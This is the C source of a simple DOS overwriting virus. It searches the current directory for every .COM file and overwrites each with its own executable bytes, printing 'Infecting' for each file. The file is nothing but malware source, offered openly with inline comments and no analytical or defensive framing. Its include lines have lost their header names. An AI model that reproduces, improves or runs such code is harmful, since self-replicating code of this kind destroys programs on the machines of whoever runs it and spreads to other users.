#include
#include
#include

FILE *Virus, *Host;
int x, y, done;
char buff[256];
struct ffblk ffblk;

main()
{
    done = findfirst("*.COM", &ffblk, 0); /* Find a .COM file */

    while (!done) /* Loop for all COM's in DIR*/
    { 
        printf("Infecting %s/n", ffblk.ff_name);   /* Inform user */
        Virus = fopen(_argv[0],"rb");              /* Open infected file */ 
        Host = fopen(ffblk.ff_name,"rb+");         /* Open new host file */
        x = 9504;

        while ( x>256 )                         /* OVERWRITE new Host */
        {                                       /* Read/Write 256 byte */
            fread(buff,256,1,Virus);            /* chunks until bytes */
            fwrite(buff,256,1,Host);            /* left < 256 */
            x-=256; 
        } 

        fread(buff, x, 1, Virus);           /* Finish off copy */
        fwrite(buff, x, 1, Host); 
        fcloseall();                        /* Close both files and*/
        done = findnext(&ffblk);            /* Go for another one. */
    }

    return (0); /* Terminate */
} 